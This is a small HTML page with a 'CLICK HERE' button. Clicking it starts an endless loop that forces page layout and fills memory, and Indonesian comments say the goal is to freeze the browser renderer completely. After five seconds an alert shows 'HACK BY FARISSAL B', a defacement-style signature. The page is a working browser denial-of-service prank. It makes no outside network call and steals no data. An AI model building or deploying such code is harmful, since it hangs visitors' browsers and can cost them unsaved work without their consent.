<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
    <title>testertster</title>
    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #fff;
      }
      button {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        padding: 15px 30px;
        font-size: 18px;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <button id="startBtn">CLICK HERE</button>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.remove();

        // HANG BERAT: layout thrashing + memory exhaustion
        // Renderer akan freeze total, alert tidak akan sempat muncul
        // sampai loop selesai (atau Chrome "Page unresponsive")
        const d = document.createElement("div");
        document.body.appendChild(d);
        const chunks = [];

        setTimeout(function () {
          let i = 0;
          while (true) {
            d.style.width = i + "px";
            void d.offsetWidth; // forced synchronous layout
            chunks.push(new Array(1e5).join("A")); // memory balloon
            i++;
          }
        }, 10);

        // Alert muncul belakangan — kalau renderer belum mati total
        setTimeout(function () {
          alert("HACK BY FARISSAL B");
        }, 5000);
      };
    </script>
  </body>
</html>
